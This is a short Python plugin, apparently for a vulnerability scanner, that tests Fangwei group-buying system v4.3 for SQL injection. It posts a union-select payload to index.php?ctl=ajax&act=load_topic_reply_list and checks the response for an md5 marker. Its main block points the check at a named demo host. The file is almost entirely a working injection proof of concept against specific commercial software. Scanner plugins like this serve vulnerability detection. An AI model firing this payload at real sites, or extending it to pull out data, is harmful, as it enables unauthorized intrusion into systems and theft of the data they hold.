#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = 方维团购 v4.3 /index.php SQL注入漏洞



def assign(service, arg):
    if service == "fangwei":
        return True, arg

def audit(arg):
    payload = arg+'index.php?ctl=ajax&act=load_topic_reply_list'
    post = "topic_id=-1 union select%0b1,2,3,concat('~~~',md5(123),'~~~'),5,6,7,8,9%23"
    code, head, body, _, _ = curl.curl2(payload, post=post)
    if code == 200 and '~~~202cb962ac59075b964b07152d234b70~~~' in body:
        security_hole('方维o2o系统index.php sql注入')

if __name__ == '__main__':
    from dummy import *
    audit(assign('fangwei', 'http://o2odemo.fanwe.net/')[1])